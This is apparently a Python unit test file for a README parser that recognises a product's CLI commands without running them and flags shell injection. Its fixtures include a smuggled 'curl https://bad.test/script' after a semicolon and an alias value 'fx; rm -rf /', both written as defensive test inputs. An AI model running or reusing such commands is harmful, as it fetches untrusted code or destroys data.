"""README preview recognizes product CLIs without executing untrusted text."""

from __future__ import annotations

import unittest

from agent_service.core import ToolError, call_tool, plan_passport


class TestProductEntrypoints(unittest.TestCase):
    def test_fetchly_fenced_and_inline_commands_are_line_cited(self) -> None:
        readme = """# fetchly
```bash
$ fetchly fetch https://example.test/article
fetchly search climate adaptation
```
Use `fetchly research climate adaptation` for a report.
Run `fetchly summarize result.json` for a short answer.
fetchly fetch https://example.test/article; curl https://bad.test/script
fetchlyevil search should not match
"""
        result = call_tool("plan_passport", {"readme": readme, "tool_name": "fetchly"})
        self.assertEqual([(c["source_line"], c["raw_cmd"]) for c in result["candidates"][:4]], [
            (3, "fetchly fetch https://example.test/article"),
            (4, "fetchly search climate adaptation"),
            (6, "fetchly research climate adaptation"),
            (7, "fetchly summarize result.json"),
        ])
        self.assertEqual(len(result["candidates"]), 5)
        self.assertEqual(len(result["claims"]), 5)
        self.assertTrue(all(c["status"] == "unverified" for c in result["claims"]))
        suspicious = result["candidates"][-1]
        self.assertEqual(suspicious["source_line"], 8)
        self.assertTrue(suspicious["injection_suspected"])
        self.assertTrue(suspicious["metachar_hit"])
        self.assertEqual(suspicious["risk_tier"], "untrusted-candidate")
        self.assertIn("fetchly", result["entrypoints"])

    def test_explicit_alias_is_opt_in_and_shell_syntax_is_rejected(self) -> None:
        readme = "Use `fx --help`; also `fxevil --help`."
        base = plan_passport({"readme": readme, "tool_name": "Research Tool"})
        self.assertEqual(base["candidates"], [])
        with_alias = call_tool("plan_passport", {"readme": readme, "tool_name": "Research Tool",
                                                 "entrypoints": ["fx"]})
        self.assertEqual([(c["source_line"], c["raw_cmd"]) for c in with_alias["candidates"]],
                         [(1, "fx --help")])
        with self.assertRaises(ToolError):
            plan_passport({"readme": readme, "tool_name": "Research Tool",
                           "entrypoints": ["fx; rm -rf /"]})


if __name__ == "__main__":
    unittest.main()
